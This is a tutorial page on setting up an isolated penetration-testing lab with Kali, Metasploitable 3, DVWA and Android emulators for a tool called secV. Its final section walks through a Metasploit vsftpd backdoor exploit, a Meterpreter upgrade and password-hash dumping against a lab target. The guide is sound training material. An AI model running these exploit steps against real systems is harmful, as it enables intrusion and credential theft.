Building Your VM Lab
From Zero

A complete guide to setting up a safe, isolated virtual machine lab environment. Covers hypervisor installation, Kali Linux setup, target VMs, network design, and first use — from an empty machine to a fully operational penetration testing lab.

Beginner Friendly Linux/macOS/Windows VirtualBox + QEMU/KVM ~2 hours to complete
01 Foundation

Why You Need a Virtual Machine Lab

You cannot safely learn penetration testing on production systems. A VM lab gives you a completely isolated environment where you can run tools, break things, restart, and try again — with zero risk to real systems.

What "virtual machine" means

A virtual machine (VM) is a software-emulated computer that runs inside your physical computer. It has its own virtual CPU, RAM, disk, and network adapters — but they're all simulated. The software that creates and manages VMs is called a hypervisor.

From inside the VM, it feels like a real computer. It boots an operating system, runs programs, has a file system. But it's isolated — what happens inside the VM stays inside the VM. You can delete and recreate it instantly. You can take snapshots (saves of the full VM state) and restore to any point in seconds.

▶ The key rule: Always run attack tools inside a VM, never on your host machine. If a tool misbehaves, malfunctions, or accidentally scans the wrong target, you simply delete the VM. Your host is untouched.

Lab topology overview

A minimal secV lab has two VMs:

Attack Box
Kali Linux
Where you run secV, Metasploit, ADB, apktool, and all attack tools. This is your attacker machine. 4 GB RAM minimum, 8 GB recommended. 50 GB disk.
Target (Linux)
Metasploitable 3
Intentionally vulnerable Linux server for practicing exploits, privilege escalation, and post-exploitation. Pre-configured with dozens of vulnerabilities. Download from Rapid7.
Target (Android)
Android Emulator
Android x86 VM or Android Studio AVD for testing android_pentest operations. Use a stock non-Google-Play-Protect-enrolled build for easiest ADB access.
Optional
Windows Server 2019
For testing adsec and winadsec AD modules. Set up a domain controller. Microsoft provides free 180-day evaluation ISOs.

All VMs share a host-only network — they can see each other but are completely cut off from your real LAN and the internet. This means even if you accidentally run a DoS attack or an exploit against a production server, your traffic never leaves the lab.

02 Setup

Host Machine Requirements

Your physical computer (the host) runs the hypervisor, which runs the VMs. The host needs enough resources to run 2–3 VMs simultaneously.

ComponentMinimumRecommendedNotes
CPU4 cores, x86_648+ coresMust support hardware virtualization: Intel VT-x or AMD-V. Check BIOS — enabled by default on most post-2015 CPUs.
RAM8 GB16–32 GBKali (4 GB) + Metasploitable (1–2 GB) + Android (2–3 GB) = 7–9 GB. Host OS needs ~4 GB. 16 GB is the comfortable minimum.
Disk100 GB free200–500 GB SSDEach VM uses 20–80 GB. Snapshots multiply storage. Use an SSD — HDD makes VMs painful to use.
OSWindows 10, Ubuntu 20.04, macOS 12Any modern 64-bit OSFor VirtualBox: Windows/macOS/Linux all work. For QEMU/KVM: Linux host required (best performance).

Check hardware virtualization in BIOS

Before installing a hypervisor, confirm your CPU's virtualization extensions are enabled:

# Linux — check if VT-x or AMD-V is enabled
grep -E 'vmx|svm' /proc/cpuinfo | head -3
# If output shows 'vmx' (Intel) or 'svm' (AMD) → virtualization is enabled

# Windows — check in Task Manager → Performance → CPU → Virtualization
# Or run in PowerShell:
(Get-WmiObject Win32_ComputerSystem).HypervisorPresent

If virtualization is disabled, reboot into BIOS/UEFI (usually F2, F10, Del, or Esc during boot) and enable Intel Virtualization Technology (VT-x) or AMD-V. Also enable VT-d (Intel) or AMD-Vi/IOMMU for USB passthrough (needed for ADB over USB to work inside a VM).

03 Hypervisor

VirtualBox — Windows & macOS

VirtualBox is the recommended hypervisor for Windows and macOS hosts. It's free, open-source, and easy to use. If you're on Linux, jump to the QEMU/KVM chapter instead — KVM gives dramatically better performance on Linux hosts.

Install VirtualBox

  1. Download the latest VirtualBox installer for your host OS from virtualbox.org/wiki/Downloads. Also download the VirtualBox Extension Pack (same page) — it enables USB 3.0 support needed for ADB passthrough.
  2. Run the installer. Accept defaults. On Windows, it will temporarily disconnect your network adapter to install the virtual network drivers — this is normal. On macOS, approve the system extension in System Preferences → Security.
  3. Launch VirtualBox. Install the Extension Pack: File → Preferences → Extensions → Add Extension Pack, select the downloaded .vbox-extpack file, and accept the license.
  4. Add yourself to the vboxusers group (Linux only) so VMs can access USB: 
    sudo usermod -aG vboxusers $USER
# Log out and back in for this to take effect
▶ VirtualBox 7.x is the current release (2025). Always install the matching Extension Pack version — mismatched versions cause USB passthrough failures.

Create the host-only network

Before creating any VMs, create a host-only network adapter. All your lab VMs will connect to this — it's your lab LAN:

# File → Host Network Manager → Create
# Set IPv4 Address: 192.168.56.1
# Set IPv4 Network Mask: 255.255.255.0
# Enable DHCP Server, Server Address: 192.168.56.100
# Lower Address Bound: 192.168.56.101
# Upper Address Bound: 192.168.56.254

# VMs with Host-Only adapter will get 192.168.56.x addresses
# Host can always reach 192.168.56.1 from any guest
04 Hypervisor

QEMU/KVM — Linux (Best Performance)

QEMU with KVM (Kernel-based Virtual Machine) is the Linux-native hypervisor. Because KVM runs inside the kernel, there's almost no overhead — VMs run at near-native CPU speed. This is what the secV developers use. If your host is Linux, use KVM.

Install QEMU/KVM and virt-manager

# Arch / CachyOS / Manjaro
sudo pacman -S qemu-full virt-manager virt-viewer libvirt dnsmasq bridge-utils ovmf

# Ubuntu / Debian / Kali
sudo apt update && sudo apt install -y \
  qemu-kvm qemu-utils libvirt-daemon-system libvirt-clients \
  virt-manager bridge-utils ovmf

# Fedora
sudo dnf install -y @virtualization virt-manager

Enable and start libvirtd

sudo systemctl enable --now libvirtd
sudo usermod -aG libvirt,kvm $USER
# Log out and back in after adding groups

# Verify KVM is accessible
kvm-ok          # shows "KVM acceleration can be used" if enabled
ls /dev/kvm     # must exist

Create the lab network

# Create an isolated host-only network (no internet access)
cat > /tmp/lab-net.xml << 'EOF'
<network>
  <name>lab-isolated</name>
  <bridge name="virbr-lab" stp="on" delay="0"/>
  <ip address="192.168.100.1" netmask="255.255.255.0">
    <dhcp>
      <range start="192.168.100.100" end="192.168.100.254"/>
    </dhcp>
  </ip>
</network>
EOF

sudo virsh net-define /tmp/lab-net.xml
sudo virsh net-start lab-isolated
sudo virsh net-autostart lab-isolated

# Verify
sudo virsh net-list --all
# Name          State   Autostart  Persistent
# lab-isolated  active  yes        yes
▶ virt-manager is the GUI frontend for KVM — use it to create and manage VMs graphically. You can also use the CLI (virt-install) for scripted VM creation.
05 Attack Box

Kali Linux VM — Your Attack Machine

Kali Linux is the standard attack OS — it ships with 600+ security tools pre-installed. This is where secV lives. You'll run every operation from this VM.

Download Kali Linux

Get the VM pre-built image from kali.org/get-kali/#kali-virtual-machines — this saves you the OS installation step. Two formats available:

FormatUse withNotes
VirtualBox OVAVirtualBoxImport directly: File → Import Appliance → select .ova. Fastest setup.
VMware OVAVMware Workstation/FusionWorks on VMware. Converted images also work on VirtualBox after format change.
QCOW2QEMU/KVMNative KVM format. Fastest with KVM. Import via virt-manager (create new → import existing disk).
ISOAny hypervisorFull installer — choose if you want control over partitioning and packages. ~3.5 GB.

VM settings — minimum configuration

SettingValueWhy
RAM4 GB (min), 8 GB (recommended)Metasploit uses ~1 GB at rest. Frida + ADB + browser = another 1–2 GB.
CPUs4 vCPUsmsfvenom payload generation uses all cores. apktool rebuilds are CPU-bound.
Disk60 GB dynamicAPK builds, MSF modules, scan logs, snapshots. Dynamic means only used space is consumed on host disk.
Network 1Host-only (lab-isolated)Primary LAN for reaching target VMs.
Network 2NATOutbound internet access for downloads (apt update, pip install, bore tunnel). Inbound blocked by NAT — safe.
USBUSB 3.0 controller enabledRequired for Android device passthrough (ADB over USB).

First boot — change default credentials

# Default Kali credentials: kali/kali
# Change immediately after first login
passwd

# Enable SSH for terminal access from host
sudo systemctl enable --now ssh
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# Get the VM's IP (connect from host: ssh kali@192.168.100.x)
ip a show eth0 | grep inet

Update and install essentials

sudo apt update && sudo apt full-upgrade -y

# Core tools (most pre-installed on Kali)
sudo apt install -y \
  git golang python3-pip adb apktool \
  metasploit-framework jadx nodejs npm \
  qrencode socat ncat libimobiledevice-utils

# Python libraries for secV
pip3 install requests beautifulsoup4 frida-tools impacket \
             ldap3 paramiko scapy psutil netifaces

# bore tunnel (required for WAN mode)
curl -L https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl.tar.gz \
  | tar xz && sudo mv bore /usr/local/bin/bore
bore --version    # should print version

# Metasploit database init (one time)
sudo msfdb init
06 Targets

Target VMs — Intentionally Vulnerable

You need safe, legal targets to practice against. These are VMs built to be vulnerable — they're designed to be attacked.

Metasploitable 3 — Linux target

Metasploitable 3 is a purposefully vulnerable Linux server from Rapid7 (the Metasploit company). It has dozens of exploitable services: FTP, SSH, HTTP, SMB, databases — all misconfigured or running old versions.

# Option 1: Download pre-built OVA from Rapid7
# Search: "Metasploitable 3 download" → rapid7 GitHub releases
# Import to VirtualBox: File → Import Appliance

# Option 2: Build from Vagrant (requires VirtualBox + Vagrant)
git clone https://github.com/rapid7/metasploitable3.git
cd metasploitable3
vagrant up ub1404   # builds Ubuntu 14.04 vulnerable VM

Set Metasploitable's network adapter to host-only (same lab network as Kali). Then from Kali:

# Find Metasploitable's IP
nmap -sn 192.168.100.0/24
# Look for the new host — that's your target
# Default creds: vagrant/vagrant or ubuntu/ubuntu

DVWA — web application target

DVWA (Damn Vulnerable Web App) is a PHP web application with intentional SQLi, XSS, CSRF, file upload, command injection vulnerabilities at adjustable difficulty. Perfect for practicing secV's websec module.

# Run DVWA as Docker on Kali (easiest method)
sudo apt install docker.io -y
sudo docker pull vulnerables/web-dvwa
sudo docker run -d -p 8080:80 vulnerables/web-dvwa

# Access at http://localhost:8080
# Default: admin/password
# Click Setup/Reset DB to initialize

VulnHub VMs — variety of targets

VulnHub (vulnhub.com) offers hundreds of free vulnerable VMs across all difficulty levels. Download the VM for any machine you want to practice against, import to VirtualBox/KVM, and attach to your host-only network. Same pattern as Metasploitable.

Good starter VMs: Kioptrix Level 1, Mr. Robot, Bashed, Blue.

07 Mobile Target

Android Emulator — Virtual Phone

Testing android_pentest operations without a physical device. The Android emulator runs a full Android system on your x86 CPU.

Option A: Android Studio AVD (most compatible)

  1. Install Android Studio from developer.android.com/studio. On Kali: sudo snap install android-studio --classic or download the tar.gz and extract.
  2. Open Android Studio → Virtual Device Manager → Create Device. Choose Pixel 4 (or any phone). Select system image: Android 11 (API 30) — Google APIs version (includes Play Store) or plain AOSP (no Play Protect, easier for testing).
  3. Start the AVD. Then connect ADB to it from Kali: 
    adb devices
# emulator-5554  device
adb -s emulator-5554 shell getprop ro.product.model
# sdk_gphone_x86

Option B: Android-x86 VM (lighter weight)

Android-x86 is a port of Android to run as a standard VM — smaller than Android Studio. Download ISO from android-x86.org:

# Create VM in VirtualBox/KVM:
# - Type: Linux, Other Linux (64-bit)
# - RAM: 2 GB
# - Disk: 8 GB
# - Network: host-only (same lab network as Kali)
# Boot from Android-x86 ISO, select "Install to hard disk"

# After boot, find the Android VM's IP:
# In Android: Settings → About tablet → IP address

# Enable ADB over TCP on the Android VM:
# In Android-x86 terminal (hold Alt+F1 for console):
setprop service.adb.tcp.port 5555
stop adbd && start adbd

# From Kali, connect:
adb connect 192.168.100.xxx:5555
adb devices
# 192.168.100.xxx:5555  device

Using a physical Android device

For physical devices (the primary use case for android_pentest):

  1. Enable Developer Mode: Settings → About Phone → tap "Build number" 7 times until "Developer options" unlocked
  2. Enable USB Debugging: Settings → Developer Options → USB Debugging → ON
  3. Connect via USB to Kali and accept the RSA key prompt on the phone
  4. Enable ADB over WiFi (so you can disconnect USB for wireless testing): 
    adb tcpip 5555
# Unplug USB. Find phone IP in Settings → WiFi → IP address
adb connect 192.168.1.xxx:5555
adb devices
  5. For USB passthrough to a VM: In VirtualBox (VM settings → USB → add filter for your Android device). In KVM: use virt-manager → Add Hardware → USB Host Device.
08 Networking

Lab Network Design

Network configuration is where most beginners get stuck. Understanding exactly what traffic goes where prevents accidents — like scanning a real target — and makes lab operations work correctly.

The recommended lab topology

┌─────────────────────────────────────────────────────────────────────┐ │ HOST MACHINE │ │ │ │ ┌──────────────────────┐ ┌──────────────────────────────┐ │ │ │ KALI VM │ │ TARGET VMs │ │ │ │ │ │ (Metasploitable, Android) │ │ │ │ NIC 1: 192.168.100.x│◄──────►│ 192.168.100.x │ │ │ │ (host-only network) │ │ (host-only) │ │ │ │ │ └──────────────────────────────┘ │ │ │ NIC 2: NAT │ │ │ │ (outbound internet │─────────────────────────────────►[WAN] │ │ │ for downloads) │ (HOST NAT → internet, inbound blocked) │ │ └──────────────────────┘ │ │ │ │ virbr-lab: 192.168.100.1/24 (host bridge — visible to VMs) │ └─────────────────────────────────────────────────────────────────────┘

Key properties of this design:

  • Kali ↔ Target VMs: full bidirectional access via host-only (192.168.100.0/24)
  • Target VMs → Internet: blocked — they have no NAT adapter
  • Kali → Internet: allowed via NAT adapter — needed for apt, pip, bore tunnel
  • Internet → Kali VM: blocked by NAT — attacker stays protected
  • Internet → Target VMs: completely blocked — safe
! Never give target VMs a NAT adapter unless you specifically need to test WAN operations. An internet-connected vulnerable VM can be found and compromised by real attackers within minutes of exposure.

10 Installation

Installing secV

secV runs on Kali Linux inside your VM (or bare metal). The installer handles all dependency detection and compilation.

Quick install

# Clone the repository
git clone https://github.com/secvulnhub/secV.git
cd secV

# Run the installer (detects distro automatically)
chmod +x install.sh
./install.sh

# What install.sh does:
# 1. Detects distro (Arch/Debian/Fedora/Alpine/macOS)
# 2. Installs system packages via package manager
# 3. Installs Python packages from rqm.md
# 4. Compiles the Go binary: go build -ldflags="-s -w" -o secV .
# 5. Optionally installs system-wide to /usr/local/bin/secV

Verify installation

# Check binary version
./secV --version

# Run the dependency check (shows ✓/✗ for every module and dep)
./secV -check-deps

# Start the shell
./secV

# Expected output:
   ███████╗███████╗ ██████╗██╗   ██╗
   ██╔════╝██╔════╝██╔════╝██║   ██║
   ███████╗█████╗  ██║     ██║   ██║
   ╚════██║██╔══╝  ██║     ╚██╗ ██╔╝
   ███████║███████╗╚██████╗ ╚████╔╝

11 Verification

Lab Health Check

Run these checks before every lab session to confirm your environment is ready. Takes 2 minutes.

# ── 1. ADB — must show device before android_pentest ──────────────────
adb devices
# 192.168.100.xxx:5555  device    ← your Android target
# emulator-5554         device    ← emulator if running

# ── 2. Metasploit database ────────────────────────────────────────────
sudo msfdb status
# [+] Dependency is connected (database: msf)

# ── 3. bore tunnel ────────────────────────────────────────────────────
bore --version
# bore 0.5.x

# ── 4. secV dependencies ──────────────────────────────────────────────
./secV -check-deps
# Shows ✓/✗ per module. Fix any ✗ before trying that module.

# ── 5. Network reachability ───────────────────────────────────────────
ping -c 2 192.168.100.xxx    # target VM — must respond
curl -s ifconfig.me          # must return an IP — confirms internet access

# ── 6. Quick smoke test — recon localhost ─────────────────────────────
./secV
secV ❯ use netrecon
secV (netrecon) ❯ set mode quick
secV (netrecon) ❯ run 127.0.0.1
# Should complete in <5 seconds with port scan results
12 First Run

Your First Lab Attack

End-to-end: discover a target VM, scan it, and get a shell. This is the full attack chain that every more advanced operation builds on.

Step 1 — Discover the target

secV ❯ use netrecon
secV (netrecon) ❯ set mode normal
secV (netrecon) ❯ run 192.168.100.0/24

# Output shows all live hosts in the lab network
# Find Metasploitable: look for open ports 21 (ftp), 22 (ssh), 80 (http), 445 (smb)
# Note its IP — e.g. 192.168.100.110

Step 2 — Deep scan the target

secV (netrecon) ❯ set mode deep
secV (netrecon) ❯ run 192.168.100.110

# Full service version scan. Output includes:
# port 21/tcp  ftp     vsftpd 2.3.4    ← backdoor CVE-2011-2523
# port 80/tcp  http    Apache 2.2.8
# port 445/tcp smb     Samba 3.x
# Risk score: 9.1 CRITICAL (many known CVEs)

Step 3 — Exploit a vulnerability (Metasploit)

The FTP service is vsftpd 2.3.4 — this has a famous backdoor that allows command execution. The exploit is a single Metasploit module:

# Start msfconsole and run the exploit
msfconsole -q

msf6 ❯ use exploit/unix/ftp/vsftpd_234_backdoor
msf6 (vsftpd_234_backdoor) ❯ set RHOSTS 192.168.100.110
msf6 (vsftpd_234_backdoor) ❯ run

# If vulnerable:
[*] 192.168.100.110:21 - Banner: 220 (vsFTPd 2.3.4)
[*] Command shell session 1 opened
$ whoami
root

Step 4 — Get a more stable Meterpreter shell

# Inside the command shell session, background it and upgrade:
msf6 ❯ background
msf6 ❯ use post/multi/manage/shell_to_meterpreter
msf6 ❯ set SESSION 1
msf6 ❯ run

# Now interact with the Meterpreter session:
msf6 ❯ sessions -i 2
meterpreter ❯ sysinfo
meterpreter ❯ hashdump     # dump password hashes
meterpreter ❯ upload /tmp/test.txt /tmp/  # file transfer
meterpreter ❯ screenshot   # capture screen
▶ Congratulations — you just ran a complete attack chain: discovery → scan → exploit → persistence in a safe isolated lab. This is the same sequence every secV module automates, just at a higher abstraction level. Now you know what's happening under the hood.

Taking and restoring snapshots

Snapshot the target VM in its pristine state so you can reset it after every practice run:

# VirtualBox — take snapshot
# Machine → Take Snapshot → name it "clean-base"

# VirtualBox CLI equivalent
VBoxManage snapshot "Metasploitable3" take "clean-base" --live

# KVM — take snapshot
sudo virsh snapshot-create-as metasploitable3 "clean-base" --disk-only

# Restore to clean state (KVM)
sudo virsh snapshot-revert metasploitable3 "clean-base"
